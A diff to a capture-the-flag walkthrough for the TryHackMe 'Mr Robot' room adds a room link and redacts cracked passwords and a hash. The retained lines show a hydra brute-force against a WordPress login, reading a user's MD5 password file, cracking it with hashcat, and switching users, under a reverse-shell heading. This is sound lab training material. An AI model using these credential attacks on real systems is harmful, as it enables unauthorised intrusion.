@@ -1,6 +1,8 @@
 ![Congrats](assets/screenshots/mr%20robot/mr%20robot%20congrats.jpg)
 
 # Mr. Robot CTF 
+**Room Link:** [Mr Robot](https://tryhackme.com/room/mrrobot)
+
 
 Step by Step Method to Get All 3 Flags:
 
@@ -63,8 +65,8 @@ wc -l fsocity_sorted.dic
 ```bash
 hydra -l Elliot -P fsocity_sorted.dic 10.48.148.118 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:S=302" -t 64
 ```
-**PASSWORD FOUND:** `ER28-0652`
-**WORDPRESS CREDENTIALS:** `Elliot:ER28-0652`
+**PASSWORD FOUND:** `[REDACTED]`
+**WORDPRESS CREDENTIALS:** `Elliot:[REDACTED]`
 
 ## Step 5: Reverse Shell Access
 Logged into WordPress admin at `http://10.48.148.118/wp-admin`
@@ -111,19 +113,19 @@ ls -la /home/robot
 ```bash
 cat /home/robot/password.raw-md5
 ```
-**HASH:** `robot:c3fcd3d76192e4007dfb496cca67e13b`
+**HASH:** `[REDACTED]`
 
 On Attack Box - Crack the hash:
 ```bash
-echo "c3fcd3d76192e4007dfb496cca67e13b" > robot.hash
+echo "[REDACTED]" > robot.hash
 hashcat -m 0 robot.hash /usr/share/wordlists/rockyou.txt --force
 ```
-**CRACKED PASSWORD:** `abcdefghijklmnopqrstuvwxyz`
+**CRACKED PASSWORD:** `[REDACTED]`
 
 Switch to robot user:
 ```bash
 su robot
-Password: abcdefghijklmnopqrstuvwxyz
+Password: [REDACTED]
 ```
 
 ```bash
